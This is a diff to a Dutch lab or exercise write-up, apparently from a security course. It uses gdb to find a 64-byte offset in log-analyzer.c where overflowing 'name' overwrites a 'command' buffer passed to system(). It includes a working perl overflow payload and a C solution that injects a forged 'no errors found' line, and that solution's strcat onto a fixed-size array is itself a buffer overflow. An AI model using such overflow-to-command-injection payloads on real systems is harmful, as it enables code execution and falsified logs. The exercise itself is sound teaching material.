@@ -1,8 +1,87 @@
 \begin{enumerate}
-  \item 
+  \item gcc-3.3 -g -o log-analyzer log-analyzer.c
+  \item gdb -q log-analyzer
+  \item (gdb) list
+  	\begin{enumerate}
+  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
+  	\item We zoeken de scharnierpunten in dit programma:
+  		\begin{enumerate}
+  		\item 1 argument: \textless servernaam\textgreater
+  		\item command
+  		\item name
+  		\item strcpy(command ... ) op lijn 20
+  			\begin{enumerate}
+  			\item command wordt uitgevoerd door system(command) (lijn 27)
+  			\item command overschrijven door strcpy(name, servernaam); op lijn 25
+  			\end{enumerate}
+  		\end{enumerate}
+  	\end{enumerate}
+  \item (gdb) break 26 
+  	\begin{enumerate}
+  	\item Adres van command bekijken
+  	\item Adres van name bekijken
+  	\end{enumerate}
+  \item (gdb) run ``blah''
+  \item (gdb) x/x command
+  	\begin{enumerate}
+  	\item 0xbffff6c0
+  	\end{enumerate}
+  \item (gdb) x/x name
+  	\begin{enumerate}
+  	\item 0xbffff680
+  	\end{enumerate}
+  \item (gdb) print 0xbffff6c0 - 0xbffff680
+  	\begin{enumerate}
+  	\item \$1 = 64
+  	\end{enumerate}
+  \item (gdb) run ``\$(perl -e `print ``A''x64 . ``echo \textbackslash{}``\textbackslash{}nEPIC TEST\textbackslash{}n\textbackslash{}''\textbackslash{}n'' ')''
+  \item x/s command
+  	\begin{enumerate}
+  	\item 0xbffff670: ``echo \textbackslash{}``\textbackslash{}nEPIC TEST\textbackslash{}n\textbackslash{}'' ''
+  	\end{enumerate}
+  \item Succes. EPIC TEST verschijnt op het scherm.
+  \item De opgave zegt dat we nu zelf een programma moeten schrijven die de juiste output genereert.
+  \item Een voorbeeldscript:
 \end{enumerate}
 
 \begin{lstlisting}
+oplossing.c
+-----------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* 
+
+Resultaat:
+-=-=-=-=-=-
+echo "Mail-server: no errors found"
+*/
+
+// ./a.out "$(perl -e 'print "A"x64 . "echo \"\nEPIC TEST\n\"\"')"    
+
+int main(int argc, char *argv[]){
+	if(argc != 1){
+		printf("\nGebruik: %s \n", argv[0]);
+		exit(0);
+	}
+
+	char command[] = "./log-analyzer \"$(perl -e 'print \"\x41\"x64 . \"echo \\\"\\n";
+	strcat(command, "Mail-server: no errors found");
+	strcat(command, "\\n\\\"\"')\"");
+
+	system(command);
+}
+
+OUTPUT:
+	Mail-server: no errors found
+\end{lstlisting}
+
+\begin{lstlisting}
+log-analyzer.c
+--------------
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
